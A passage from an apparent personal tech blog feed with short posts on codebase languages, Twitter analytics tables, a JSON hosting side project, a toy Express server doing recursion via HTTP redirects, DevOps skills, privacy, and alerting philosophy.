<p>On a related note, I’m repeating the same exercise in 2015 but am modifying the template a bit in order to collect more structure data. I’m going to be tracking the times I sleep and wake up rather than the duration and decided to put all the foods under a single column rather than per meal to make it easier to include snacks. The other big change was splitting my mood columns into a physical and a mood component to measure them separately. Looking forward to seeing what I discover in 2015.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Limited language codebases</title>
   <link href="http://dangoldin.com/2015/01/09/limited-language-codebases/"/>
   <updated>2015-01-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/09/limited-language-codebases</id>
   <content:encoded><![CDATA[
<p>I’ve discussed the pros and cons of having a codebase out of a few languages versus having the choice made per project or application with a bunch of people and opinions differ. On one hand, having many languages provides flexibility in choosing the right language for the job and allows engineers to learn and explore new tools. Better habits are encouraged since the interface between components requires a well structured and tested structure rather than relying on code similarity. On the other, it prevents code and component reuse and makes it difficult for teams to standardize around a style and codebase. Also, engineers can’t switch projects as easily as they’d be able to under a common language and prevents the depth of knowledge one gets from working on a shared codebase with others.</p>

<p>I used to think the flexibility of being able to choose the right language for the job was the only thing that mattered but now prefer a limited language codebase. With modern languages, libraries, and tools it’s easy to write good code in any language and there are only a few applications that warrant a specific language, and even then only at scale.</p>

<p>My perfect mix is a static, strongly typed language for large, complex codebases that have high performance needs, a scripting language for one off tasks and processes and for quick experimentation, and JavaScript with a framework for the frontend. The static, strongly typed language makes it much easier to refactor code and improves performance while the scripting languages make it easy to quickly get something working or prototype an idea. My current favorites are Java and python - they’re both easy to write and complement each other’s weaknesses. Something I haven’t had a chance to explore in depth is moving to Jython or another JVM based scripting language - that would provide the benefits of the highly functional and robust Java code from a scripting context.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some quick Twitter analytics analysis</title>
   <link href="http://dangoldin.com/2015/01/06/some-quick-twitter-analytics-analysis/"/>
   <updated>2015-01-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/06/some-quick-twitter-analytics-analysis</id>
   <content:encoded><![CDATA[
<p>I finally got around to exploring the Twitter analytics data and wanted to see whether I could find anything useful. My dataset contained 831 tweets, every single one since October 2013, as well as the text, the number of impressions, and the number of engagements. Just by loading the data into Excel, calculating a few values, and generating a pivot table it’s easy to investigate a few ideas. I’ve included some of the pivot tables below along with the various items that stood out.</p>

<table class="table small">
  <thead>
    <tr>
      <th></th>
      <th>Has hashtag</th>
      <th>No hashtag</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>Has mention</th>
      <td>171</td>
      <td>251</td>
    </tr>
    <tr>
      <th>No mention</th>
      <td>237</td>
      <td>181</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Avg impressions vs hashtag and mention (excluding @replies): Idea was to investigate whether tweets with hastags or mentions end up being due to the fact that they are more likely to appear in search results. The results are a bit weird since it seems as if having a hashtag only helps if there wasn’t also an @ mention. Otherwise it hurts.</li>
</ul>

<table class="table small">
  <thead>
    <tr>
      <th>@mention</th>
      <th># tweets</th>
      <th>Total engagments</th>
      <th>Total impressions</th>
      <th>Avg engagement rate</th>
      <th>Engagements / Impressions</th>
      <th>Avg impressions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>No</td>
      <td>446</td>
      <td>2192</td>
      <td>89714</td>
      <td>2.7%</td>
      <td>2.4%</td>
      <td>201</td>
    </tr>
    <tr>
      <td>Yes</td>
      <td>385</td>
      <td>914</td>
      <td>58112</td>
      <td>2.9%</td>
      <td>1.6%</td>
      <td>151</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>I suspected that sending someone an @reply would reduce total impressions but increase the engagement rate since it’s directed at someone. It does reduce the average impressions and only leads to a slight increase in engagement rate - and only when looking at the average of rates, not the total engagements over total impressions. I suspect most people don’t differentiate between an @reply and an @mention which doesn’t lead to a significant difference in actual engagement rates.</li>
</ul>

<table class="table small">
  <thead>
    <tr>
      <th>Has mention</th>
      <th># tweets</th>
      <th>Total engagments</th>
      <th>Total impressions</th>
      <th>Avg engagement rate</th>
      <th>Engagements / Impressions</th>
      <th>Avg impressions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>No</td>
      <td>331</td>
      <td>1524</td>
      <td>62850</td>
      <td>2.6%</td>
      <td>2.4%</td>
      <td>190</td>
    </tr>
    <tr>
      <td>Yes</td>
      <td>115</td>
      <td>668</td>
      <td>26864</td>
      <td>2.8%</td>
      <td>2.5%</td>
      <td>234</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>If we exclude @replies and compare tweets with and without mentions, the tweets with mentions have both a higher average number of impressions and a higher engagement. Nothing surprising here - @mentions are good since they draw attention to a tweet while @replies hurt since they limit total reach. Still nice to have some data to confirm.</li>
</ul>

<table class="table small">
  <thead>
    <tr>
      <th>Has Link</th>
      <th># Tweets</th>
      <th>Total engagements</th>
      <th>Total impressions</th>
      <th>Engagement rate</th>
      <th>Avg impressions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>No</td>
      <td>426</td>
      <td>990</td>
      <td>59385</td>
      <td>1.7%</td>
      <td>139.4</td>
    </tr>
    <tr>
      <td>Yes</td>
      <td>405</td>
      <td>2116</td>
      <td>88441</td>
      <td>2.4%</td>
      <td>218.4</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Tweets with links have higher engagement - most likely since there’s a stronger call to action. Again this isn’t surprising but nice to see it backed up by a bit of data.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Introducing jsonify.me</title>
   <link href="http://dangoldin.com/2015/01/04/introducing-jsonifyme/"/>
   <updated>2015-01-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/04/introducing-jsonifyme</id>
   <content:encoded><![CDATA[
<p>Over the past few weeks I’ve been experimenting with Node.js and wanted to share the project I’ve been working on, <a href="http://jsonify.me/" target="_blank">jsonify.me</a>. It’s an “API only” product without an interface other than a <a href="http://jsonify.me/" target="_blank">documentation page</a>. The idea is to allow anyone to have a publicly accessible URL endpoint that can contain whatever information they want as long as it can be stored as a JSON object. In my case, I have all sorts of semi-structured data that I want to make accessible and keeping it under my domain (<a href="http://json.dangoldin.com" target="_blank">json.dangoldin.com</a>) makes it easy to access for whoever is savvy enough to figure it out.</p>

<p>The code is still in the early stages and needs to be cleaned up but the core functionality is there. It works by uploading each user’s JSON object to S3 and then doing a redirect whenever a GET request is made to that user’s subdomain. In my case I registered an account with jsonify.me, got an authentication token, set json.dangoldin.com as my subdomain, updated the CNAME record of json.dangoldin.com to point to domains.jsonify.me, and then made a POST request to json.dangoldin.com with my JSON object which uploaded it to S3 under my username.</p>

<p>I love the idea of a semi-structured format evolving over time as more and more people standardize around common field names as well as a set of third party apps that will migrate data from other services into these JSON objects. Imagine being able to have a service that will authenticate with LinkedIn and then extract the relevant data and put it as JSON into your object or a service that fetches new posts from your blog and adds them to your JSON object. There’s still a long way to go and the code right now is very minimal but I’d love to see people give it a shot and suggest improvements.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Redirect recursion</title>
   <link href="http://dangoldin.com/2014/12/31/redirect-recursion/"/>
   <updated>2014-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/31/redirect-recursion</id>
   <content:encoded><![CDATA[
<p>I’ve stumbled onto what seems to be a solution without a problem but something that’s been fun to experiment with and might have an actual application. The idea is to replace a recursion step with a URL redirection. In this situation the base case will return a 200 response while the recursive step will do a redirection with a slightly updated URL. The sample node server below uses this idea to handle a three tasks - sum up to n, compute a factorial, and test whether an integer is prime.</p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">express</span>  <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">),</span>
    <span class="nx">port</span> <span class="o">=</span> <span class="mi">4000</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/sum</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="dl">'</span><span class="s1">n</span><span class="dl">'</span><span class="p">),</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span><span class="p">,</span>
      <span class="nx">a</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">),</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Sum: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">a</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/sum?n=</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;a=</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">n</span><span class="p">);</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/fact</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="dl">'</span><span class="s1">n</span><span class="dl">'</span><span class="p">),</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">1</span><span class="p">,</span>
          <span class="nx">a</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">),</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Factorial: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">a</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/fact?n=</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;a=</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="o">*</span><span class="nx">n</span><span class="p">);</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/isPrime</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="dl">'</span><span class="s1">n</span><span class="dl">'</span><span class="p">),</span><span class="mi">10</span><span class="p">),</span>
      <span class="nx">f</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">param</span><span class="p">(</span><span class="dl">'</span><span class="s1">f</span><span class="dl">'</span><span class="p">),</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">2</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">&gt;</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">n</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Prime</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">%</span> <span class="nx">f</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Composite</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/isPrime?n=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">n</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;f=</span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">f</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Server started on port </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">port</span><span class="p">);</span></code></pre></figure>

<p>The only cases I can think of where it’s even remotely useful is if your servers are behind a CDN and you want to cache every intermediate result without having to write the application logic to do it or you need to reduce the amount of work done by a single HTTP request. It’s just not an efficient approach otherwise - the overhead of making new HTTP connections and handling arguments for every recursive step is usually more expensive than doing the actual logic within a single request.</p>

<p>The other use case I can think of is purely educational - it forces you to write your recursive code in a tail recursive style and forces you to think about the state you need to share between redirect requests. And if you’re ever told to solve a problem without using for loops or recursion you can violate the spirit of the request by using a series of HTTP redirects.</p>

<p>I’m genuinely curious if there’s an actual use case for this and whether anyone’s had to do this.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A new Turing test</title>
   <link href="http://dangoldin.com/2014/12/29/a-new-turing-test/"/>
   <updated>2014-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/29/a-new-turing-test</id>
   <content:encoded><![CDATA[
<p>A friend sent me <a href="http://www.bloombergview.com/articles/2014-06-09/fake-victory-for-artificial-intelligence" target="_blank">an article</a> where the author discusses the recent news of an AI finally beating the Turing test and how he himself was clearly able to determine that the AI was not a human. The most common explanation of the Turing test is where someone communicates with both a human and an AI and is not able to tell which is the machine and which is the human. It’s almost always phrased in the way that a human will act normally and the AI will try to act as a human, mistakes, typos, and imperfect information.</p>

<p>Regardless of whether modern AIs can beat the Turing test I think it’s inevitable that an AI will conclusively beat the Turing test in the coming years. A more interesting question is whether a human can trick another human into thinking he or she is an AI. It’s similar to the Turing test in that it’s supposed to make the AI and human indistinguishable to a judge but instead of making the AI smarter we’re dumbing down the human.</p>

<p>The nice thing about this approach is that historically it was very easy for a human to act as an AI by making dumb mistakes and responding with non-sequiturs. I suspect it’s currently quite difficult to respond in a way that would convince someone you’re an AI, even after enough time speaking with one, and I’d love to see this attempted. In the end both of these approaches converge to the same goal of making AIs and humans indistinguishable and this is just another way of looking at it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>DevOps for the rest of us</title>
   <link href="http://dangoldin.com/2014/12/26/devops-for-the-rest-of-us/"/>
   <updated>2014-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/26/devops-for-the-rest-of-us</id>
   <content:encoded><![CDATA[
<p>I’m becoming increasingly convinced that DevOps is a necessary skill for any software engineer to have. It gets you closer to the hardware and helps you understand the way your code will actually run and where it fits within the tech stack. It also provides independence when working on new projects since it gives you both the knowledge to understand the needs as well as empowers you to make them happen. This is especially important when working at a small company where there’s immense value in having general skills that can be used to make progress independently without need to disrupt others. My first job writing code I only had to worry about my small patch of software but over time I’ve slowly picked up a variety of DevOps skills that help me write better code. Below are the skills that every software engineer should know - they may not all fall under traditional DevOps but I believe they’re essential for anyone writing code. If you have any others let me know and I’ll add them to the list.</p>

<ul>
  <li><strong>Shell commands</strong>. Almost any task can be done efficiently using a series of shell commands. Being aware of the various commands and their options makes it simple to find specific files, summarize data, or just monitor a server. The most important ones are ls, cd, pwd, rm, wc, find, grep, head, tail, less, sort, cut, sed, and curl.</li>
  <li><strong>Configuration of various applications</strong>. This might be specific to Linux/Unix but knowing the default configurations of common applications and where the settings are is important when setting up an application and diagnosing problems. There have been countless times I installed something on my box only to run into issues with unexpected behavior. Being able to examine the configuration and grep through the logs is critical to understanding what’s actually happening.</li>
  <li><strong>Package managers</strong>. Both the ones by provided by the operating system (apt and yum) as well as the language specific ones (pip, npm, gem, CPAN). There already so many powerful open source tools and libraries available that it’s rare to find something that can’t at least serve as a starting point for whatever you’re building.</li>
  <li><strong>Web architecture</strong>. This is a big one but it’s crucial to understand how the internet works from the time you type in a web address to a browser to what’s going to happen on the server. A good starting point is to look at Amazon Web Services and be able to explain each of the services offered, how they’re used, and how they fit together. Even better is to play with them to get a sense of how they can be used.</li>
  <li><strong>Setting up and deploying an application on a brand new VPS</strong>. Using AWS or Digital Ocean it’s trivial to get a virtual private server (VPS) but it will come completely empty. Being able to log in, install the necessary software, and get it responding to external requests is vital for anyone writing web code. Even better is deploying multiple applications on the same VPS and configuring DNS to make it work.</li>
  <li><strong>Back of the envelope calculations</strong>. Having a sense of how long various types of requests and operations take is important in understanding the type of hardware you need and where optimizations can be made. Another good skill is thinking in terms of “bytes.” This helps you estimate how much memory your code is using and makes it easy to understand what solutions are scalable and which will end up causing problems.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Passive technology and the decline of privacy</title>
   <link href="http://dangoldin.com/2014/12/20/passive-technology-and-the-decline-of-privacy/"/>
   <updated>2014-12-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/20/passive-technology-and-the-decline-of-privacy</id>
   <content:encoded><![CDATA[
<p>I just discovered that Google launched a new <a href="http://searchengineland.com/google-store-visits-estimated-conversions-metric-adwords-211254" target="_blank">AdWords feature</a> to help brick and mortar store owners track the effect their online spending is having in the offline world. The way it works is that if a user sees an ad for a particular store or product on their phone and then ends up close (based on the location sharing option in iOS and Android) to the store in question, Google will use that information as a signal that the ad was the cause of the store visit. It’s not supposed to be perfectly accurate but the idea is that with enough data Google can come up with models that can estimate the actual numbers.</p>

<p>Mapping online spend to offline conversions has been the holy grail ever since advertisers started spending online and with the proliferation of smart phones that track everything we’re getting closer and closer to solving that problem. For centuries advertisers had to estimate and have faith that their spend in newspapers, magazines, and public spaces was having an impact with no good way of measuring the results. The ability to track a person’s location is immensely powerful and we’ll start seeing more and more use cases. Using a similar approach it may even be possible to see what effect a billboard ad has: monitor the locations of your ads and if anyone walks by them assign a probability that they’ve seen it. Then if they end up in your store you can assume they got there by looking at the ad. It’s significantly more difficult than that since people see hundreds of ads a day and the result is not always immediate but even having a tiny bit of data is better than none at all.</p>

<p>This should make everyone a lot more concerned about their privacy. In the past it was simple to have distinct lives - home versus work, inside versus outside, online versus offline - but with our attachment to modern gadgets the lines are rapidly blurring. Being aware is the first step in avoiding being tracked but it’s only a short term solution. As technology improves we’ll rely more and more on passive benefits which when coupled with better and faster data mining algorithms will make it very hard to live “off-grid.” We rely on government to preserve our privacy but I worry that we’re moving too quickly for the legislative process to have any real impact. Bitcoin and other distributed systems may be able to counter this decrease in privacy and I’m curious to see what sort of counter-systems they’re able to produce.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon's Fire TV Stick</title>
   <link href="http://dangoldin.com/2014/12/18/amazons-fire-tv-stick/"/>
   <updated>2014-12-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/18/amazons-fire-tv-stick</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/firestick.jpg" alt="Fire stick" width="475" height="370" layout="responsive"/>
  <p class="caption">Photo by <a href="http://www.ranchodelaluna.com/views/pages/09_firestick_dancing.htm">Rancho de la Luna</a></p>
</div>

<p>Earlier this week I set up Amazon’s <a href="http://www.amazon.com/Amazon-W87CUN-Fire-TV-Stick/dp/B00GDQ0RMG">Fire TV Stick</a> and wanted to jot down some thoughts while they’re still fresh. For the $20 promotion price, it’s a great deal. My alternative was an Xbox 360 along with a Raspberry Pi running XBMC. The Xbox would be used for streaming shows on Netflix and watching older DVDs while the Raspberry Pi would let me watch various files off of a USB stick. I’ve never tried a Chromecast so don’t know how the Fire Stick compares but so far it’s been much quicker to startup and navigate than either the Xbox or the Raspberry Pi. When all you want to do is watch a quick show during dinner it’s a bit frustrating when you’re done eating by the time the Netflix app is ready to use on the Xbox.</p>

<p>Other than speed, the other big benefit has been the ability to use my phone as a remote. This allows both voice search, which Amazon has been doing a good job of transcribing, as well as a real keyboard. Having to type by navigating an alphabetically-sorted on screen keyboard with a laggy controller is not fun.</p>

<p>I haven’t had a chance to install any games or explore any of the other apps but I’m still impressed. It might be time to finally get rid of the Xbox and the old DVDs.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why log me out?</title>
   <link href="http://dangoldin.com/2014/12/16/why-log-me-out/"/>
   <updated>2014-12-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/16/why-log-me-out</id>
   <content:encoded><![CDATA[
<p>Now that fantasy football season is over for me and I have no risk of angering the fantasy football gods I can complain about an interface decision in the Yahoo Fantasy Football Android app. Every once in a while the app will sign me out, which I suspect is a security feature, but I can log back in without having to re-enter a password. The only effect this “feature” has is getting me annoyed. The app has clean and simple visual design but that shouldn’t be prioritized over actual usability. Hopping between apps is such a common task that developers should strive to make it as painless as possible. This may involve changing the views around to make them more light weight or figuring out a way to simulate behavior without having to show a loading screen but it definitely makes the app feel snappier and more responsive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Waiting for the aha moment</title>
   <link href="http://dangoldin.com/2014/12/14/waiting-for-the-aha-moment/"/>
   <updated>2014-12-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/14/waiting-for-the-aha-moment</id>
   <content:encoded><![CDATA[
<p>Something I’ve encountered is being stuck on a difficult problem but then taking a break until an “aha moment” just materializes. This happened throughout college on difficult problem sets as well as countless engineering projects at work. Sometimes instead of getting hung up on a tough problem the best thing to do is to forget about it and go for a walk and let the subconscious take over. I don’t know why this works but it seems to be common with others as well.</p>

<p>Bill Gates takes an <a href="http://www.wsj.com/articles/SB111196625830690477" target="_blank">annual reading vacation</a> where he reads books across a variety of disciplines in order to have their themes cross pollinate and spawn new thoughts and ideas. This isn’t a conscious process and he relies on his subconscious to do the organization and connect the different ideas together. This is akin to what happens when we stop thinking about a tough problem and focus on something else: the mind is free to wander and may combine them into something that’s useful - or at least inspire another thought that may be relevant.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Travel to appreciate technological growth</title>
   <link href="http://dangoldin.com/2014/12/13/travel-to-appreciate-technological-growth/"/>
   <updated>2014-12-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/13/travel-to-appreciate-technological-growth</id>
   <content:encoded><![CDATA[
<p>If you’re constantly watching something grow it’s hard to notice the magnitude while those further away see it immediately. This is well known for parents not seeing how quickly their children are growing but obvious for distant relatives and friends who get a glimpse once every few months.</p>

<p>I have the same relationship with technology. I’m surrounded by it each day that it’s hard to tell how much it’s changed but a way to combat this bias is by traveling, especially to developing countries.</p>

<p>I’m writing this blog post on a Macbook Air that has a ridiculous amount of battery life at the Delhi airport while tethered to a mobile hotspot running off of my US phone. It’s not as fast nor as comfortable as what I get at home or in the office but it’s incredible, especially when compared to my two prior trips, a year ago and four years ago. During last year’s trip I had to buy a cheap Android phone and spent countless <a href="/2013/12/23/getting-a-sim-card-in-india/">hours running around</a> trying to get a working SIM card. This time I didn’t even have change SIM cards due to T-Mobile’s global roaming plan. Four years ago I didn’t even bother doing anything on my phone and had a 3G USB dongle that required it’s own proprietary software to even connect to the internet.</p>

<p>New apps and products launching is just the surface, the biggest changes are happening to infrastructures that make these experiences possible. These aren’t visible day to day but are unmistakable when seen year to year and traveling makes them apparent.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Piketty and the power of data</title>
   <link href="http://dangoldin.com/2014/12/09/piketty-and-the-power-of-data/"/>
   <updated>2014-12-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/09/piketty-and-the-power-of-data</id>
   <content:encoded><![CDATA[
<p>I read Thomas Piketty’s Capital in the Twenty-First Century a couple of months ago but have only organized my notes and thoughts now. It’s a simple, enjoyable read that provides an overview of the modern western economies and offers a compelling explanation of how wealth and income equality occur. I took a variety of economics classes in college but none of them felt as concrete as the book: Piketty does a great job introducing simple mathematical relationships and then simulating the results under different conditions. This allows the reader to get a feel for the data and makes the ideas much more tangible than an abstract formula. Piketty couples this with the economic data from the past two centuries to craft a persuasive argument for the causes of wealth accumulation.</p>

<p>Countless others have looked through the data, identified issues, and provided counterarguments so I don’t want to get into that but I do want to highlight how important having data is for all types of research. If we’re serious about these topics we should strive to collect as much data as possible while making it as accessible as possible. Piketty spent numerous hours collecting and transcribing the data from various paper sources and it’s amazing what came out; I can only imagine how much other valuable research would come out if there was more publicly available data.</p>

<p>Governments should be responsible for collecting data and releasing it publicly. Many are starting to do this already although it still tends to be obfuscated behind a navigational maze and hidden in esoterically formatted PDFs. Over time we should see it become more transparent as the data formats standardize and we develop better tools to dig through the existing data.</p>

<p>Another issue we need to address is data correctness. On one hand it’s great that people are going through Piketty’s data and making sure it’s valid but on the other if it’s extremely confrontational and used to invalidate his work it serves as a warning to others that plan on releasing their data. Why would a researcher spend thousands of hours collecting data and making it accessible and then have to deal with the critics who find a few issues? Much easier to keep the data hidden and only provide the high level numbers that can’t easily be challenged without doing the hard work. This perverse incentive needs to be resolved if we expect to see high quality researched being produced with open sourced data.</p>

<p>I’m hopeful that these larger scope theories with potential societal-impact become more common as we move into the 21st century. We have an increasing variety of tools to start making sense of this data with both individuals and institutions being more involved in organizing the world’s data. No theory will ever be perfect or explain every case but having more data will serve as a guide for governments to hopefully improve life for their citizens. And if data is collected along the way it will fuel more analysis with actionable insights.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Internetless coding</title>
   <link href="http://dangoldin.com/2014/12/07/internetless-coding/"/>
   <updated>2014-12-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/07/internetless-coding</id>
   <content:encoded><![CDATA[
<p>Whenever I fly I try to be at least somewhat productive. This time it entailed finishing up an old blog post and messing around with Node.js on a side project. They say the only way to appreciate something is when it’s gone and that’s how I feel about developing without internet access. It’s such a common occurrence to need to look up the documentation for a particular function or library or search for novel error messages that my approach is completely altered without the internet. Where before a few visits to Google or Stack Overflow would have taken care of the problem now I get to rely on man pages as well as dozens small experiments to figure out what’s happening.</p>

<p>It’s definitely not as efficient as having everything at your fingertips but it’s definitely fun in small doses. In my case I get to brush up on some rusty skills and also get to be a detective when diagnosing bugs. Knowing that you will be coding without internet also forces you to set up a standalone development environment. This requires making sure all the static assets you use are available locally and can be served by your application as well as making sure you have a local database that contains realistic data.</p>

<p>It’s tough to avoid the internet when coding but it’s a worthwhile exercise to attempt a few times a month - it will make you appreciate what you have but also introduce you to a whole new set of skills.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Symptom based monitoring</title>
   <link href="http://dangoldin.com/2014/12/01/symptom-based-monitoring/"/>
   <updated>2014-12-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/12/01/symptom-based-monitoring</id>
   <content:encoded><![CDATA[
<p>A month or so ago I read Rob Ewaschuk’s <a href="https://docs.google.com/document/d/199PqyG3UsyXlwieHaqbGiWVa8eMWi8zzAn0YfcApr8Q/preview?sle=true" target="_blank">philosophy on alerting</a> and since then I’ve been trying to be more aware of the alerts we have and whether any can be improved. The most actionable insight was to start thinking in terms of “symptom-based monitoring” where the alerts should reflect what the users are experiencing rather than various issues along the tech stack. This aligns your alerts with user expectations and can also simplify alerting since they will all be running at a high level. It may take longer to diagnose what the underlying problem is but it will reduce the total number of alerts required.</p>

